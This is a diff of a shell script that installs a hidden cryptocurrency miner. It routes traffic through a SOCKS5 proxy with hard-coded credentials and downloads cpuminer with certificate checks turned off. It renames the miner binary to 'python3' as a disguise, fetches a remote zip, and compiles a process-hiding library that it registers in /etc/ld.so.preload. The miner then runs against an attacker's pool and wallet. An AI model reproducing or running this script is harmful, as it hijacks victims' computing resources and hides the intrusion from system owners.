@@ -11,7 +11,7 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 154.13.24.58:6316
+socks5 = 185.205.194.126:7646
 socks5_username = ingfoingfo
 socks5_password = maszZeehh
 END
@@ -30,13 +30,10 @@ echo ""
 echo " "
 echo " "
 
-echo ""
-
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.29/cpuminer-opt-linux.tar.gz
-tar -xf cpuminer-opt-linux.tar.gz
+./graftcp/graftcp wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz --no-check-certificate && tar xf cpuminer-opt-linux.tar.gz && mv cpuminer-avx2 python3
 
 ./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
 unzip magicBezzHash.zip
@@ -45,4 +42,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./cpuminer-sse2 -a yespower -o stratum+tcp://yespower.eu.mine.zergpool.com:6533 -u TP7jVMfWwALwX2xBHkw6fA3qJWxiKyQkhz -p c=TRX,mc=BTE,ID=Tukijo -t $(nproc)
+./graftcp/graftcp ./python3 -a yespower -o stratum+tcp://137.184.136.62:443 -u web1qfzgk7ukgrdewp0q370tty9r0rp9cgkzew339lw.rk -p x -t4
